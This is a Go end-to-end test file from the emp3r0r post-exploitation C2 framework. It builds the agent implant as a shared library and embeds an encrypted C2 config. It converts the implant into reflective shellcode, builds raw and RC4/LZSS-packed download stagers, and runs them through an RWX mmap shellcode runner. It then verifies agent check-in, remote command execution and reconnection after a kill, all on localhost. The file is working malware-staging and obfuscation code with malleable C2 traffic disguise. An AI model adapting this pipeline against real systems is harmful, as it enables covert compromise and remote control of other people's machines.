//go:build linux && cgo

package shellcode_stager

import (
	"bytes"
	"context"
	"crypto/ecdsa"
	"crypto/rand"
	"crypto/sha256"
	"crypto/x509"
	"encoding/asn1"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"math/big"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"testing"
	"time"

	"github.com/fxamacker/cbor/v2"
	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/config"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/jobs"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/server"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/listener"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/sliverarmory/malasada"
)

// stagerOpts controls which stager variant build.sh produces.
type stagerOpts struct {
	// format is the --stager-format argument: "shellcode" (raw) or "packed".
	format string
	// unpacker selects the self-unpacking algorithm when format == "packed":
	// "rc4" (encrypted) or "lzss" (compressed).  Ignored for raw format.
	unpacker string
	// transport is the --transport argument passed to build.sh.
	transport string
}

// artifactName returns the filename that build.sh produces for these options.
func (o stagerOpts) artifactName() string {
	if o.format == "packed" {
		return "stager-packed.bin"
	}
	return "stager.bin"
}

// signUUID signs the agent UUID with the CA private key.
func signUUID(uuidStr, keyFile string) (string, error) {
	keyBytes, err := os.ReadFile(keyFile)
	if err != nil {
		return "", err
	}
	block, _ := pem.Decode(keyBytes)
	privKey, err := x509.ParseECPrivateKey(block.Bytes)
	if err != nil {
		return "", err
	}
	hash := sha256.Sum256([]byte(uuidStr))
	r, s, err := ecdsa.Sign(rand.Reader, privKey, hash[:])
	if err != nil {
		return "", err
	}
	sig, err := asn1.Marshal(struct{ R, S *big.Int }{r, s})
	if err != nil {
		return "", err
	}
	return base64.URLEncoding.EncodeToString(sig), nil
}

// ---------------------------------------------------------------------------
// Top-level tests
// ---------------------------------------------------------------------------

// TestAgentEndToEndLifecycle exercises the raw (unpacked) stager over all
// supported C2 modes and download transports.
func TestAgentEndToEndLifecycle(t *testing.T) {
	if os.Getenv("CGO_ENABLED") != "1" {
		t.Skip("Skipping test: CGO_ENABLED is not set to 1")
	}
	if os.Getenv("EMP3R0R_RACE_ON") == "1" {
		t.Skip("Skipping test: race detector is enabled")
	}
	transports := []string{"http", "libcurl"}
	for _, mode := range []string{def.C2ChannelModeH2Conn, "http_poll"} {
		for _, tr := range transports {
			mode, tr := mode, tr
			t.Run(mode+"/"+tr, func(t *testing.T) {
				opts := stagerOpts{format: "shellcode", transport: tr}
				runAgentEndToEndLifecycle(t, mode, opts)
			})
		}
	}
}

// TestPackerEndToEnd exercises the self-unpacking packed stager for each
// combination of unpacking algorithm (rc4, lzss) and download transport
// (http, libcurl).  Every variant must decrypt/decompress itself, jump to the
// inner stager, download the malasada payload, and produce an agent check-in
// followed by a successful command round-trip with a live runner process.
//
// A single C2 mode (H2Conn) is used; the raw lifecycle tests cover mode ×
// transport combinations independently.
func TestPackerEndToEnd(t *testing.T) {
	if os.Getenv("CGO_ENABLED") != "1" {
		t.Skip("Skipping test: CGO_ENABLED is not set to 1")
	}
	if os.Getenv("EMP3R0R_RACE_ON") == "1" {
		t.Skip("Skipping test: race detector is enabled")
	}
	for _, unpacker := range []string{"rc4", "lzss"} {
		for _, tr := range []string{"http", "libcurl"} {
			unpacker, tr := unpacker, tr
			t.Run("packed/"+unpacker+"/"+tr, func(t *testing.T) {
				opts := stagerOpts{
					format:    "packed",
					unpacker:  unpacker,
					transport: tr,
				}
				runAgentEndToEndLifecycle(t, def.C2ChannelModeH2Conn, opts)
			})
		}
	}
}

// ---------------------------------------------------------------------------
// Shared lifecycle implementation
// ---------------------------------------------------------------------------

// runAgentEndToEndLifecycle is the full end-to-end test driver.  It is
// parameterised by C2 mode and stager options so it can be reused by both
// the raw and packed test suites.
func runAgentEndToEndLifecycle(t *testing.T, mode string, opts stagerOpts) {
	t.Helper()

	// -----------------------------------------------------------------------
	// 1. Setup workspace
	// -----------------------------------------------------------------------
	tmpDir, err := os.MkdirTemp("", "stager_test_*")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)
	logging.Infof("Test workspace: %s", tmpDir)

	// -----------------------------------------------------------------------
	// 2. Build agent as ELF shared library (-buildmode=c-shared).
	//
	// Parameters mirror build.sh's build_shared_object() for linux/amd64:
	//   - tags:       "release emp3r0r_so"  (netgo is not added for linux in build.sh)
	//   - -buildvcs=false, -trimpath
	//   - -buildmode c-shared
	//   - ldflags:    -s -w -linkmode external
	//   - extldflags: -Wl,--gc-sections -s
	// "emp3r0r_so" activates main_cgo_shared.go which exports the `main`
	// symbol that malasada's stage0 calls after reflective loading.
	// -----------------------------------------------------------------------
	agentSOPath := filepath.Join(tmpDir, "agent.so")
	cmdBuildAgent := exec.Command(
		"go", "build",
		"-buildmode=c-shared",
		"-tags", "release emp3r0r_so",
		"-trimpath",
		"-buildvcs=false",
		"-ldflags", "-s -w -linkmode external -extldflags '-Wl,--gc-sections -s'",
		"-o", agentSOPath,
		"../../../cmd/agent",
	)
	cmdBuildAgent.Env = append(os.Environ(), "CGO_ENABLED=1")
	out, err := cmdBuildAgent.CombinedOutput()
	if err != nil {
		t.Fatalf("Failed to build agent shared library: %v\nOutput: %s", err, string(out))
	}
	logging.Successf("Agent shared library built at %s", agentSOPath)

	// -----------------------------------------------------------------------
	// 3. Setup C2 server config and certs.
	//    Must happen before malasada conversion so we can embed the real config
	//    into the .so before compression.
	// -----------------------------------------------------------------------
	c2Port := util.RandInt(50000, 60000)
	c2PortStr := fmt.Sprintf("%d", c2Port)

	live.EmpWorkSpace = tmpDir
	live.IsServer = true
	transport.EmpWorkSpace = tmpDir
	transport.CaCrtFile = filepath.Join(tmpDir, "ca-cert.pem")
	transport.CaKeyFile = filepath.Join(tmpDir, "ca-key.pem")
	transport.ServerCrtFile = filepath.Join(tmpDir, "server-cert.pem")
	transport.ServerKeyFile = filepath.Join(tmpDir, "server-key.pem")
	transport.OperatorCaCrtFile = filepath.Join(tmpDir, "operator-ca-cert.pem")
	transport.OperatorCaKeyFile = filepath.Join(tmpDir, "operator-ca-key.pem")
	transport.OperatorServerCrtFile = filepath.Join(tmpDir, "operator-server-cert.pem")
	transport.OperatorServerKeyFile = filepath.Join(tmpDir, "operator-server-key.pem")
	transport.OperatorClientCrtFile = filepath.Join(tmpDir, "operator-client-cert.pem")
	transport.OperatorClientKeyFile = filepath.Join(tmpDir, "operator-client-key.pem")
	live.EmpConfigFile = filepath.Join(tmpDir, "emp3r0r.json")

	if err = config.InitCertsAndConfig(); err != nil {
		t.Fatalf("Failed to init certs and config: %v", err)
	}
	if err = config.GenC2Certs("127.0.0.1"); err != nil {
		t.Fatalf("Failed to generate C2 certs: %v", err)
	}

	caCertData, err := os.ReadFile(transport.CaCrtFile)
	if err != nil {
		t.Fatalf("Failed to read CA cert: %v", err)
	}
	transport.CACrtPEM = caCertData
	transport.EmpWorkSpace = tmpDir

	agentUUID := uuid.New().String()
	agentTag := "test-stager-agent-" + agentUUID
	agentSig, err := signUUID(agentUUID, transport.CaKeyFile)
	if err != nil {
		t.Fatalf("Failed to sign UUID: %v", err)
	}

	c2HttpPortStr := fmt.Sprintf("%d", c2Port+1)
	preflightURL := fmt.Sprintf("http://127.0.0.1:%s/preflight-test", c2HttpPortStr)
	if mode == def.C2ChannelModeH2Conn {
		preflightURL = fmt.Sprintf("https://127.0.0.1:%s/preflight-test", c2PortStr)
	}

	malleableCfg := def.MalleableHTTPConfig{
		C2Path:        "/api/v1/telemetry",
		SessionHeader: "Cookie",
		SessionValue:  "sessionID=%s",
		InitHeader:    "Cookie",
		InitValue:     "init=1",
		CloseHeader:   "Cookie",
		CloseValue:    "close=1",
	}
	routes := def.C2Routing{
		Checkin: "c2-checkin",
		Msg:     "c2-msg",
		FTP:     "c2-ftp",
		WWW:     "c2-www",
		Proxy:   "c2-proxy",
	}

	live.RuntimeConfig = &def.Config{
		CCH2Port:         c2PortStr,
		CCHTTPPort:       c2HttpPortStr,
		C2ChannelMode:    mode,
		CAPEM:            string(caCertData),
		C2Routes:         routes,
		PreflightEnabled: true,
		PreflightURL:     preflightURL,
		PreflightMethod:  "GET",
		MalleableC2:      malleableCfg,
	}

	live.AgentControlMap = sync.Map{}
	live.AgentList = make([]*def.Emp3r0rAgent, 0)
	time.Sleep(100 * time.Millisecond)

	// -----------------------------------------------------------------------
	// 4. Encrypt config and patch the placeholder into the raw .so.
	//
	// IMPORTANT: patch BEFORE calling malasada.ConvertSharedObject so the
	// config bytes are already in place when aplib compresses the .so.
	// Patching after compression fails because aplib collapses the 4096-byte
	// run of 0xff into a short back-reference — the literal placeholder no
	// longer exists in the output blob.
	// -----------------------------------------------------------------------
	cfg := &def.Config{
		CCAddress:        "127.0.0.1",
		CCH2Port:         c2PortStr,
		CCHTTPPort:       c2HttpPortStr,
		C2ChannelMode:    mode,
		CAPEM:            string(caCertData),
		C2Routes:         routes,
		AgentUUID:        agentUUID,
		AgentUUIDSig:     agentSig,
		AgentTag:         agentTag,
		ModulePath:       "",
		CCTimeout:        1000,
		PreflightEnabled: true,
		PreflightURL:     preflightURL,
		PreflightMethod:  "GET",
		IsRunByStager:    true,
		MalleableC2:      malleableCfg,
	}
	cborBytes, err := cbor.Marshal(cfg)
	if err != nil {
		t.Fatalf("Failed to marshal config: %v", err)
	}
	encConfig, err := crypto.AES_GCM_Encrypt([]byte(def.MagicString), cborBytes)
	if err != nil {
		t.Fatalf("Failed to encrypt config: %v", err)
	}
	if len(encConfig) < len(def.AgentConfig) {
		encConfig = append(encConfig, bytes.Repeat([]byte{0x00}, len(def.AgentConfig)-len(encConfig))...)
	} else if len(encConfig) > len(def.AgentConfig) {
		t.Fatalf("Config payload too large: %d > %d", len(encConfig), len(def.AgentConfig))
	}

	// Patch placeholder in the raw .so bytes.
	soBytes, err := os.ReadFile(agentSOPath)
	if err != nil {
		t.Fatalf("Failed to read agent.so: %v", err)
	}
	placeholder := bytes.Repeat([]byte{0xff}, len(def.AgentConfig))
	if !bytes.Contains(soBytes, placeholder) {
		t.Fatalf("AgentConfig placeholder (0xff * %d) not found in agent.so. "+
			"Verify the agent is built with the correct tags so def.AgentConfig is embedded.",
			len(def.AgentConfig))
	}
	patchedSOBytes := bytes.Replace(soBytes, placeholder, encConfig, 1)
	patchedSOPath := filepath.Join(tmpDir, "agent_patched.so")
	if err := os.WriteFile(patchedSOPath, patchedSOBytes, 0o755); err != nil {
		t.Fatalf("Failed to write patched agent.so: %v", err)
	}
	logging.Successf("agent.so patched with config (%d bytes)", len(patchedSOBytes))

	// -----------------------------------------------------------------------
	// 5. Convert the patched .so to a malasada reflective-ELF blob.
	//
	// Output layout: [malasada stage0 shellcode][aplib-compressed patched .so]
	// The stage0 entry convention matches downloader.c:
	//   typedef void (*stage1_entry)(void *base_addr, size_t total_size);
	// -----------------------------------------------------------------------
	malasadaPayload, err := malasada.ConvertSharedObject(patchedSOPath, "main", true)
	if err != nil {
		t.Fatalf("malasada.ConvertSharedObject failed: %v", err)
	}
	logging.Infof("Malasada payload size: %d bytes", len(malasadaPayload))

	payloadPath := filepath.Join(tmpDir, "agent_payload.bin")
	if err := os.WriteFile(payloadPath, malasadaPayload, 0o644); err != nil {
		t.Fatalf("Failed to write malasada payload: %v", err)
	}
	logging.Successf("Malasada payload ready")

	// -----------------------------------------------------------------------
	// 6. Start C2 server
	// -----------------------------------------------------------------------
	server.OPERATORS.Store("dummy", nil)
	if network.EmpTLSServer != nil {
		network.EmpTLSServer.Shutdown(network.EmpTLSServerCtx)
		time.Sleep(500 * time.Millisecond)
	}
	go func() {
		logging.Infof("Starting C2 server on port %s", c2PortStr)
		server.StartC2AgentTLSServer()
	}()
	if mode == "http_poll" {
		go server.StartC2HTTPServer()
	}
	defer func() {
		if network.EmpTLSServer != nil {
			network.EmpTLSServer.Shutdown(network.EmpTLSServerCtx)
		}
	}()
	time.Sleep(2 * time.Second)

	// -----------------------------------------------------------------------
	// 7. Build the stager shellcode via build.sh.
	//
	// For the raw format, build.sh produces stager.bin — the downloader
	// shellcode that fetches and RC4-decrypts the malasada payload then jumps
	// to it.
	//
	// For the packed format, build.sh additionally links the self-unpacking
	// stub (unpack_stub_<unpacker>.c) around the inner stager and runs the
	// matching packer script (pack_<unpacker>.py).  The result is
	// stager-packed.bin: a blob whose first bytes are the unpack stub's
	// _start, which decrypts/decompresses the inner stager in-place and
	// jumps to it, producing the same execution flow as the raw case but
	// with an additional obfuscation layer.
	//
	// Both variants are run identically: mmap RWX, copy, call offset 0.
	// -----------------------------------------------------------------------
	stagerListenerPort := util.RandInt(60001, 65000)
	stagerPortStr := fmt.Sprintf("%d", stagerListenerPort)
	stagerKey := "password123"

	buildArgs := []string{
		"--download-host", "127.0.0.1",
		"--download-port", stagerPortStr,
		"--download-path", "/",
		"--download-key", stagerKey,
		"--stager-format", opts.format,
		"--transport", opts.transport,
		"--debug",
	}
	if opts.format == "packed" && opts.unpacker != "" {
		buildArgs = append(buildArgs, "--unpacker", opts.unpacker)
	}

	buildCmd := exec.Command("./build.sh", buildArgs...)
	buildCmd.Dir = ".."
	buildCmd.Env = append(os.Environ(), "CGO_ENABLED=0")
	out, err = buildCmd.CombinedOutput()
	if err != nil {
		t.Fatalf("build.sh failed: %v\nOutput: %s", err, string(out))
	}
	logging.Successf("Stager compiled (%s format, %s unpacker, %s transport)",
		opts.format, opts.unpacker, opts.transport)

	// The artifact filename differs between raw and packed.
	srcArtifact := filepath.Join("..", opts.artifactName())
	stagerArtifact := filepath.Join(tmpDir, "stager_artifact.bin")
	input, err := os.ReadFile(srcArtifact)
	if err != nil {
		t.Fatalf("Failed to read %s: %v", opts.artifactName(), err)
	}
	if err := os.WriteFile(stagerArtifact, input, 0o755); err != nil {
		t.Fatalf("Failed to copy %s to tmp: %v", opts.artifactName(), err)
	}
	logging.Infof("Stage-0 artifact: %s (%d bytes)", opts.artifactName(), len(input))

	// Sanity-check the packed artifact size.
	//
	// RC4 encrypts without compressing, so the packed blob is always the inner
	// stager size PLUS the unpack stub overhead (≥400 bytes); it must be
	// strictly larger than the raw stager.
	//
	// LZSS compresses, so the packed blob can be *smaller* than the raw stager
	// when the compression ratio is good enough to offset the stub overhead.
	// For LZSS we only assert that a non-trivial blob was produced.
	if opts.format == "packed" {
		rawArtifact := filepath.Join("..", "stager.bin")
		rawBytes, _ := os.ReadFile(rawArtifact)
		switch opts.unpacker {
		case "rc4":
			if len(rawBytes) > 0 && len(input) <= len(rawBytes) {
				t.Errorf("rc4 packed stager (%d bytes) should be larger than raw stager (%d bytes) — packing may have failed",
					len(input), len(rawBytes))
			}
		case "lzss":
			// The unpack stub alone is ~290 bytes; a valid packed blob must be
			// at least that size plus a few bytes of compressed payload.
			const minLZSSSize = 300
			if len(input) < minLZSSSize {
				t.Errorf("lzss packed stager (%d bytes) is suspiciously small (< %d) — packing may have failed",
					len(input), minLZSSSize)
			}
		}
	}

	// Remove the build artefact from the source tree so the next test run
	// starts from a clean state.
	os.Remove(srcArtifact)

	// -----------------------------------------------------------------------
	// 8. Start payload listener.
	//
	// buildServedBlob RC4-encrypts the malasada payload with the key derived
	// from stagerKey — matching rc4_crypt in downloader_main.
	// -----------------------------------------------------------------------
	go func() {
		if err := listener.HTTPListener(payloadPath, stagerPortStr, stagerKey); err != nil {
			logging.Errorf("Stager listener failed: %v", err)
		}
	}()
	listenerReady := false
	for range 100 {
		conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%s", stagerPortStr))
		if err == nil {
			conn.Close()
			listenerReady = true
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	if !listenerReady {
		t.Fatalf("Stager listener failed to start on port %s", stagerPortStr)
	}

	// -----------------------------------------------------------------------
	// 9. Build a thin C runner that mmap's the stager shellcode and jumps to
	// it.  Both raw and packed stagers have _start at offset 0 of the blob,
	// so the runner is format-agnostic.
	// -----------------------------------------------------------------------
	runnerSrc := filepath.Join(tmpDir, "stager_runner.c")
	runnerBin := filepath.Join(tmpDir, "stager_runner")
	runnerCode := "#define _GNU_SOURCE\n" +
		"#include <stdio.h>\n" +
		"#include <stdlib.h>\n" +
		"#include <sys/mman.h>\n" +
		"#include <unistd.h>\n" +
		"#include <fcntl.h>\n" +
		"int main(int argc, char **argv) {\n" +
		"    if (argc < 2) { fprintf(stderr, \"Usage: %s <stager.bin>\\n\", argv[0]); return 1; }\n" +
		"    int fd = open(argv[1], O_RDONLY);\n" +
		"    if (fd < 0) { perror(\"open\"); return 1; }\n" +
		"    long size = lseek(fd, 0, SEEK_END); lseek(fd, 0, SEEK_SET);\n" +
		"    fprintf(stderr, \"[runner] stager artifact: %ld bytes\\n\", size);\n" +
		"    void *buf = mmap(NULL, (size_t)size, PROT_READ|PROT_WRITE|PROT_EXEC,\n" +
		"                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);\n" +
		"    if (buf == (void*)-1) { perror(\"mmap\"); close(fd); return 1; }\n" +
		"    if (read(fd, buf, (size_t)size) != size) { perror(\"read\"); return 1; }\n" +
		"    close(fd);\n" +
		"    fprintf(stderr, \"[runner] jumping to %p\\n\", buf); fflush(stderr);\n" +
		"    ((void(*)(void))buf)();\n" +
		"    return 0;\n" +
		"}\n"
	if err := os.WriteFile(runnerSrc, []byte(runnerCode), 0o644); err != nil {
		t.Fatalf("Failed to write runner source: %v", err)
	}
	if out, err := exec.Command("gcc", "-rdynamic", "-o", runnerBin, runnerSrc, "-ldl").CombinedOutput(); err != nil {
		t.Fatalf("Failed to build stager runner: %v\nOutput: %s", err, string(out))
	}

	var stdout, stderr bytes.Buffer
	cmdRunner := exec.Command(runnerBin, stagerArtifact)
	logging.Infof("Running stager runner (format=%s unpacker=%s transport=%s)...",
		opts.format, opts.unpacker, opts.transport)

	cmdRunner.Stdout = &stdout
	cmdRunner.Stderr = &stderr
	cmdRunner.Env = append(
		os.Environ(),
		fmt.Sprintf("HOME=%s", tmpDir),
		"STAGER_TEST=1",
	)
	if err := cmdRunner.Start(); err != nil {
		t.Fatalf("Failed to start stager: %v", err)
	}
	doneChan := make(chan error, 1)
	go func() { doneChan <- cmdRunner.Wait() }()

	// -----------------------------------------------------------------------
	// 10. Wait for agent check-in.
	// -----------------------------------------------------------------------
	timeout := 60 * time.Second
	start := time.Now()
	var agent *def.Emp3r0rAgent
	for {
		if time.Since(start) > timeout {
			fmt.Printf("Runner Stdout:\n%s\n", stdout.String())
			fmt.Printf("Runner Stderr:\n%s\n", stderr.String())
			t.Fatalf("Timeout waiting for agent checkin")
		}
		live.AgentControlMap.Range(func(key, value any) bool {
			k := key.(*def.Emp3r0rAgent)
			v := value.(*live.AgentControl)
			if k.Tag != "" && v.Conn != nil {
				agent = k
				return false
			}
			return true
		})
		if agent != nil {
			logging.Successf("Agent checked in! Tag: %s", agent.Tag)
			break
		}
		select {
		case err := <-doneChan:
			fmt.Printf("Runner Stdout:\n%s\n", stdout.String())
			fmt.Printf("Runner Stderr:\n%s\n", stderr.String())
			t.Fatalf("Stager runner exited before agent checkin: %v", err)
		default:
		}
		time.Sleep(100 * time.Millisecond)
	}

	// -----------------------------------------------------------------------
	// 11. Verify command execution.
	// -----------------------------------------------------------------------
	logging.Infof("Verifying command execution...")
	job := jobs.CreateJob("ls", "command", agent.Tag)
	cmdID := job.ID
	live.CmdTime.Store(cmdID, time.Now().Format("2006-01-02 15:04:05.999999999 -0700 MST"))
	if err = agents.SendCmd("ls", cmdID, agent); err != nil {
		t.Fatalf("Failed to send command to agent: %v", err)
	}
	logging.Infof("Sent 'ls' command to agent %s", agent.Tag)

	outputReceived := false
	for i := 0; i < 20; i++ {
		if val, ok := live.AgentControlMap.Load(agent); ok {
			if val.(*live.AgentControl).Conn == nil {
				t.Fatalf("Agent disconnected while waiting for command output!")
			}
		}
		if res, ok := live.CmdResults.Load(cmdID); ok {
			output := res.(string)
			logging.Successf("Command output received: %s", output)
			if len(output) > 0 {
				outputReceived = true
				break
			}
		}
		time.Sleep(1 * time.Second)
	}
	if !outputReceived {
		t.Fatalf("Failed to receive command output")
	}
	logging.Println("Command output verification passed.")

	// -----------------------------------------------------------------------
	// 12. Restart / reconnection test.
	//
	// With the malasada pipeline the agent runs in-process inside the runner
	// (no separate child process).  We attempt to find a child PID; if none is
	// found we skip the kill-and-reconnect sub-test but still verify the runner
	// is alive.
	// -----------------------------------------------------------------------
	logging.Infof("Testing restart/reconnection...")
	runnerPid := cmdRunner.Process.Pid
	entries, err := os.ReadDir("/proc")
	if err != nil {
		t.Fatalf("Failed to read /proc: %v", err)
	}
	childPid := 0
	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		isNum := true
		for _, r := range entry.Name() {
			if r < '0' || r > '9' {
				isNum = false
				break
			}
		}
		if !isNum {
			continue
		}
		pid, _ := strconv.Atoi(entry.Name())
		data, err := os.ReadFile(fmt.Sprintf("/proc/%d/stat", pid))
		if err != nil {
			continue
		}
		lp := bytes.LastIndexByte(data, ')')
		if lp < 0 || lp+2 >= len(data) {
			continue
		}
		fields := strings.Fields(string(data[lp+2:]))
		if len(fields) < 2 {
			continue
		}
		if ppid, _ := strconv.Atoi(fields[1]); ppid == runnerPid {
			childPid = pid
			break
		}
	}

	if childPid == 0 {
		logging.Warningf("No child process under runner PID %d — skipping kill-reconnect sub-test (agent runs in-process with malasada)", runnerPid)
	} else {
		logging.Infof("Killing agent process %d...", childPid)
		syscall.Kill(childPid, syscall.SIGKILL)

		var oldConn net.Conn
		if val, ok := live.AgentControlMap.Load(agent); ok {
			if ctrl, ok := val.(*live.AgentControl); ok {
				oldConn = ctrl.Conn
			}
		}
		startRestart := time.Now()
		reconnected := false
		lastCleanup := time.Time{}
		cleanupByUUID := func(u string) {
			live.AgentControlMap.Range(func(key, value any) bool {
				a, okA := key.(*def.Emp3r0rAgent)
				ctrl, okC := value.(*live.AgentControl)
				if !okA || !okC || a.UUID != u {
					return true
				}
				if ctrl.Cancel != nil {
					ctrl.Cancel()
				}
				if ctrl.Conn != nil {
					ctrl.Conn.Close()
				}
				live.AgentControlMap.Delete(key)
				return true
			})
		}
		for time.Since(startRestart) < 30*time.Second {
			if k, v, _, found := agents.RuntimeControlByUUID(agent.UUID); found {
				newConn := v != nil && v.Conn != nil && (oldConn == nil || v.Conn != oldConn)
				fresh := !k.LastSeen.IsZero() && !k.LastSeen.Before(startRestart)
				newPID := k.Process != nil && k.Process.PID != childPid
				if newConn || fresh || newPID {
					reconnected = true
				}
			}
			if reconnected {
				logging.Successf("Agent reconnected after kill.")
				break
			}
			if mode == "http_poll" && time.Since(startRestart) > 1*time.Second &&
				(lastCleanup.IsZero() || time.Since(lastCleanup) >= 5*time.Second) {
				agents.EndSession(agent.UUID)
				cleanupByUUID(agent.UUID)
				lastCleanup = time.Now()
			}
			time.Sleep(500 * time.Millisecond)
		}
		if !reconnected {
			t.Fatalf("Agent failed to reconnect after kill")
		}
	}

	// -----------------------------------------------------------------------
	// Final: verify runner is still alive.
	// -----------------------------------------------------------------------
	select {
	case err := <-doneChan:
		logging.Debugf("Runner Stdout:\n%s", stdout.String())
		logging.Debugf("Runner Stderr:\n%s", stderr.String())
		t.Fatalf("Stager runner process died unexpectedly: %v", err)
	default:
		logging.Println("Stager runner still running — test passed.")
	}

	logging.Successf("runAgentEndToEndLifecycle PASSED (format=%s unpacker=%s mode=%s transport=%s)",
		opts.format, opts.unpacker, mode, opts.transport)

	// -----------------------------------------------------------------------
	// Cleanup
	// -----------------------------------------------------------------------
	cmdRunner.Process.Kill()
	listener.StopHTTP()
	if network.EmpTLSServer != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		network.EmpTLSServer.Shutdown(ctx)
		network.EmpTLSServerCancel()
	}
	if network.EmpKCPCancel != nil {
		network.EmpKCPCancel()
	}
}
